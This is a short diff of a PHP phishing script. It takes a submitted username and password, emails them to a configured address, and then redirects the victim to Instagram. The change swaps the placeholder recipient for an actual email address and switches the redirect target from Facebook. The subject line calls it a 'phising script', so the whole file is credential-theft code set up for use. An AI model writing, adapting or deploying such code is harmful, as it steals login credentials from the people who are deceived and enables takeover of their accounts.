@@ -3,7 +3,7 @@
 		$username = $POST['username'];
 		$password = $POST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "heeba19@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
@@ -13,6 +13,6 @@
 	}
 	
 	if(mail_sender()){
-		header("Location: http://www.facebook.com");
+		header("Location: http://www.instagram.com");
 	}
 ?>
